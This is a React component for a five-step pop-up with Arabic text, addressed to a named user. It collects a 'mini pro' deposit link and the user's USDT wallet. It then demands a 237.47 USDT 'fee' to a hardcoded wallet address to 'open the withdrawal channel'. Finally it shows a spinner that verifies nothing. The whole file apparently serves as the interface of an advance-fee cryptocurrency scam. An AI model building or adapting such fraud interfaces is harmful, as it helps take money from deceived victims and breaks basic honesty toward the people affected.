
import React, { useState } from 'react';
import { Copy, CheckCircle2, Loader2 } from 'lucide-react';

interface ProcessModalProps {
  onClose: () => void;
}

const ProcessModal: React.FC<ProcessModalProps> = ({ onClose }) => {
  const [step, setStep] = useState(1);
  const [miniProLink, setMiniProLink] = useState('');
  const [walletLink, setWalletLink] = useState('');
  const [copied, setCopied] = useState(false);

  const walletAddress = "0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d";

  const handleCopy = () => {
    navigator.clipboard.writeText(walletAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const nextStep = () => setStep((s) => s + 1);

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/20 backdrop-blur-[1px]">
      <div className="bg-white w-full max-w-sm rounded-[24px] shadow-2xl overflow-hidden animate-in fade-in zoom-in duration-300">
        <div className="p-6 flex flex-col items-center text-center">
          
          {step === 1 && (
            <>
              <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mb-4">
                <CheckCircle2 size={32} className="text-blue-500" />
              </div>
              <h3 className="text-lg font-bold text-gray-800 mb-3">اهلا بك alaaa153</h3>
              <p className="text-sm text-gray-600 leading-relaxed mb-6">
                تم حل أمر المهام اضغط التالي وقم بوضع رابط المنصه mini pro لقسم الايداع حصرا
              </p>
              <button 
                onClick={nextStep}
                className="w-full py-3.5 bg-gradient-to-r from-[#1F6AE1] to-[#0B4DB8] text-white rounded-[14px] font-bold shadow-lg active:scale-[0.98] transition-all"
              >
                التالي
              </button>
            </>
          )}

          {step === 2 && (
            <>
              <h3 className="text-lg font-bold text-gray-800 mb-3 text-right w-full">رابط منصة mini pro</h3>
              <p className="text-xs text-gray-500 mb-4 text-right w-full">يرجى وضع رابط قسم الإيداع حصراً</p>
              <input 
                type="text"
                dir="ltr"
                placeholder="https://minipro.example.com/deposit"
                className="w-full p-4 bg-gray-50 border border-gray-100 rounded-[14px] mb-6 outline-none focus:border-blue-400 text-sm"
                value={miniProLink}
                onChange={(e) => setMiniProLink(e.target.value)}
              />
              <button 
                onClick={nextStep}
                disabled={!miniProLink}
                className="w-full py-3.5 bg-gradient-to-r from-[#1F6AE1] to-[#0B4DB8] text-white rounded-[14px] font-bold shadow-lg disabled:opacity-50 transition-all"
              >
                التالي
              </button>
            </>
          )}

          {step === 3 && (
            <>
              <h3 className="text-lg font-bold text-gray-800 mb-3 text-right w-full">رابط محفظة BEP20</h3>
              <p className="text-xs text-gray-500 mb-4 text-right w-full">ضع رابط محفظة USDT (BEP20) الخاصة بك</p>
              <input 
                type="text"
                dir="ltr"
                placeholder="0x..."
                className="w-full p-4 bg-gray-50 border border-gray-100 rounded-[14px] mb-6 outline-none focus:border-blue-400 text-sm"
                value={walletLink}
                onChange={(e) => setWalletLink(e.target.value)}
              />
              <button 
                onClick={nextStep}
                disabled={!walletLink}
                className="w-full py-3.5 bg-gradient-to-r from-[#1F6AE1] to-[#0B4DB8] text-white rounded-[14px] font-bold shadow-lg disabled:opacity-50 transition-all"
              >
                التالي
              </button>
            </>
          )}

          {step === 4 && (
            <>
              <h3 className="text-lg font-bold text-gray-800 mb-3">خطوة الإيداع النهائية</h3>
              <div className="bg-blue-50/50 p-4 rounded-[16px] mb-6 text-right">
                <p className="text-[13px] text-gray-700 leading-relaxed">
                  اهلا بك <span className="font-bold">alaaa153</span> بقي أمر إيداع مبلغ <span className="text-blue-600 font-bold">237.47 عملة usdt beb 20</span> لفتح قناة السحب.
                </p>
                <p className="text-[11px] text-gray-500 mt-2">
                  هذه الضريبه هي اجور منصتنا وليس لها أي صله بمنصه mini pro.
                </p>
              </div>
              
              <div className="w-full bg-gray-50 p-3 rounded-[12px] border border-dashed border-gray-300 mb-6 flex items-center justify-between">
                <span className="text-[10px] text-gray-400 font-mono break-all text-left flex-1 mr-2">{walletAddress}</span>
                <button 
                  onClick={handleCopy}
                  className="p-2 bg-white rounded-lg shadow-sm active:bg-gray-100 transition-colors"
                >
                  {copied ? <CheckCircle2 size={16} className="text-green-500" /> : <Copy size={16} className="text-blue-500" />}
                </button>
              </div>

              <button 
                onClick={nextStep}
                className="w-full py-3.5 bg-gradient-to-r from-[#1F6AE1] to-[#0B4DB8] text-white rounded-[14px] font-bold shadow-lg active:scale-[0.98] transition-all"
              >
                تم الايداع
              </button>
            </>
          )}

          {step === 5 && (
            <div className="py-8">
              <Loader2 size={48} className="text-blue-500 animate-spin mb-6 mx-auto" />
              <h3 className="text-lg font-bold text-gray-800 mb-2">جاري التحقق...</h3>
              <p className="text-sm text-gray-500">
                الرجاء الانتظار للتأكد من عمليه الايداع
              </p>
            </div>
          )}

        </div>
      </div>
    </div>
  );
};

export default ProcessModal;
